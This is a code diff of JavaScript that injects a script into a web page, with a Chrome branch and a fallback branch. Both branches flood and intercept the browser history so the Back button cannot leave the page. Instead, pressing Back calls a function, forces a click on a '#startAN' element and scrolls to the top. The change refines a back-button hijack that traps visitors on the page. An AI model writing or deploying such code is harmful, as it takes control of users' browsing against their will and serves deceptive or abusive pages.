@@ -1016,20 +1016,26 @@ myFunc = function(){};
 setTimeout(() => { const str =
 `
 <script>
+if(navigator.userAgent.indexOf("Chrome") != -1) {
+
 ! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
 history.go(1);
-one();
-document.querySelector('#startAN').click();
-setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
 }); } } catch (o) {} }();
-<\/script>
 
-<script>
 window.history.pushState(null, null, window.location.href);
 window.onpopstate = function () {
 one();
 document.querySelector('#startAN').click();
 setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
+};
+
+} else {
+
+history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
+history.pushState(null, null, document.URL);
+one();
+});
+
 };
 <\/script>
 
